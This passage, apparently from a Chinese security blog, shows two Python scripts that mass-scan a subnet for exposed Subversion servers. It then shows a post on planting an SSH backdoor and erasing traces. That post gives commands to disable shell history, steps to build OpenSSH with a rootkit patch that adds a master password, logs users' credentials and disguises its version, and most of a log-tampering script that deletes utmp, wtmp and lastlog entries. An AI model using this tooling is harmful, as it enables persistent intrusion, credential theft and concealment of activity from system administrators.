            sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"RA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> target<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
            out<span class="token punctuation">,</span> err <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span>   re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token punctuation">:</span>
                <span class="token keyword">print</span> target

<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        item <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            svn_scan<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span> targets<span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>====2017-12-15更新</p>
<p>关于多线程，上面两个的<code>q.join</code>写错了，删掉之后改为:</p>
<pre class="line-numbers language-none"><code class="language-none">map(lambda x: x.join(), threads)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>扫描<code>/24</code>的主机，花费的时间从8s变为了0.5s，时间不是这么计算的。</p>
<p>如果上面没有设置线程的daemon，最后运行的时候会一直卡着，因为进程默认不会停的，要这样:</p>
	

	</div>
  <a type="button" href="/2016/04/15/svn-scan.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>程序是最开始学习Python写的，基本是东拼西凑，从这个程序开始接触多进程。有两个版本第一种是直接使用<code>sock</code>的<code>connect</code>连接来判断，第二种使用了<code>scapy</code>，本着追求最快的程序，结果使用<code>scapy</code>比<code>socket</code>要慢好多。</p>
<p>下面是第一个程序，使用<code>socket</code>扫描:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*-coding:utf-8-*-</span>

<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span>PIPE
<span class="token keyword">import</span> re
<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
<span class="token keyword">import</span> socket
<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

iplist <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
            s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> s<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3690</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
                <span class="token punctuation">(</span>out<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">:</span>
                     <span class="token keyword">print</span> ip
            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
       ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
       <span class="token keyword">try</span><span class="token punctuation">:</span>
            svn_scan<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
       <span class="token keyword">finally</span><span class="token punctuation">:</span>
            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span>iplist<span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>然后是使用了<code>scapy</code>的<code>syn</code>扫描：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> logging
logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span> <span class="token comment">#关闭import scapy的警告</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time
<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
<span class="token keyword">import</span> threading

conf<span class="token punctuation">.</span>verb <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#关闭输出</span>
targets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ans <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> ans <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    <span class="token keyword">elif</span> ans<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> ans<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">18</span><span class="token punctuation">:</span>
            sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"RA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span>
            p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> target<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
            out<span class="token punctuation">,</span> err <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span>   re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token punctuation">:</span>
                <span class="token keyword">print</span> target

<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        item <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            svn_scan<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span> targets<span class="token punctuation">)</span>
    threads <span class="token operator">=</span> <span class="token punctuation">[</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>====2017-12-15更新</p>
<p>关于多线程，上面两个的<code>q.join</code>写错了，删掉之后改为:</p>
<pre class="line-numbers language-none"><code class="language-none">map(lambda x: x.join(), threads)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>扫描<code>/24</code>的主机，花费的时间从8s变为了0.5s，时间不是这么计算的。</p>
<p>如果上面没有设置线程的daemon，最后运行的时候会一直卡着，因为进程默认不会停的，要这样:</p>
	
	</div>
  <a type="button" href="/2016/04/15/svn-scan.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/04/13/clear-ssh-history.html" >SSH后门和清除痕迹</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-04-13  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>对于SSH来说，登录主机之后先执行：<br><code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace </code></p>
<p>然后是SSH留后门的方法<a target="_blank" rel="noopener" href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>简单来说就是以下的代码：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> -y openssl openssl-devel pam-devel
http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
<span class="token function">tar</span> zxvf openssh-5.9p1.tar.gz   
<span class="token function">tar</span> zxvf 0x06-openssh-5.9p1.patch.tar.gz   
<span class="token builtin class-name">cd</span> openssh-5.9p1.patch/   
<span class="token function">cp</span> sshbd5.9p1.diff <span class="token punctuation">..</span>/openssh-5.9p1   
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/openssh-5.9p1   
patch <span class="token operator">&lt;</span> sshbd5.9p1.diff   //patch  后门
执行vi includes.h

+<span class="token comment">#define ILOG "/tmp/ilog" //记录登录到本机的用户名和密码</span>
+<span class="token comment">#define OLOG "/tmp/olog" //记录本机登录到远程的用户名和密码</span>
+<span class="token comment">#define SECRETPW "123456654321" //你后门的密码</span>

执行vi version.h

<span class="token comment">#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"</span>
<span class="token comment">#define SSH_PORTABLE "小版本号"</span>
./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc/ssh --with-pam --with-kerberos5
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span> 
<span class="token function">service</span> sshd restart //重启sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p>
<p>接下来删除登录的历史记录，使用<a target="_blank" rel="noopener" href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>代码复制过来：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python </span>
<span class="token keyword">import</span> os<span class="token punctuation">,</span> struct<span class="token punctuation">,</span> sys
<span class="token keyword">from</span> pwd <span class="token keyword">import</span> getpwnam
<span class="token keyword">from</span> time <span class="token keyword">import</span> strptime<span class="token punctuation">,</span> mktime
<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser
 
UTMPFILE <span class="token operator">=</span> <span class="token string">"/var/run/utmp"</span>
WTMPFILE <span class="token operator">=</span> <span class="token string">"/var/log/wtmp"</span>
LASTLOGFILE <span class="token operator">=</span> <span class="token string">"/var/log/lastlog"</span>
 
LAST_STRUCT <span class="token operator">=</span> <span class="token string">'I32s256s'</span>
LAST_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">)</span>
 
XTMP_STRUCT <span class="token operator">=</span> <span class="token string">'hi32s4s32s256shhiii4i20x'</span>
XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">getXtmp</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
    xtmp <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token builtin">bytes</span> <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span>XTMP_STRUCT_SIZE<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
 
            data <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>
            record <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> record<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            xtmp <span class="token operator">+=</span> <span class="token builtin">bytes</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> xtmp
 
 
<span class="token keyword">def</span> <span class="token function">modifyLast</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> strtime<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> getpwnam<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'No such user.'</span><span class="token punctuation">)</span>
 
    timestamp <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        str2time <span class="token operator">=</span> strptime<span class="token punctuation">(</span>strtime<span class="token punctuation">,</span> <span class="token string">'%Y:%m:%d:%H:%M:%S'</span><span class="token punctuation">)</span>
        timestamp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mktime<span class="token punctuation">(</span>str2time<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Time format err.'</span><span class="token punctuation">)</span>
 
    data <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>LAST_STRUCT_SIZE <span class="token operator">*</span> p<span class="token punctuation">.</span>pw_uid<span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
 
 
<span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> msg
    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">saveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> contents<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w+b'</span><span class="token punctuation">)</span>
        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>contents<span class="token punctuation">)</span>
    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        showMessage<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    usage <span class="token operator">=</span> 'usage<span class="token punctuation">:</span> logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">2</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span>\n \
        logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">3</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span> <span class="token operator">-</span>t tty1 <span class="token operator">-</span>d <span class="token number">2015</span><span class="token punctuation">:</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">12</span>'
    parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span>usage<span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-m'</span><span class="token punctuation">,</span> <span class="token string">'--mode'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'MODE'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'1'</span> <span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--ttyname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TTYNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--filename'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'FILENAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--username'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'USERNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--hostname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'HOSTNAME'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--dateline'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'DATELINE'</span><span class="token punctuation">)</span>
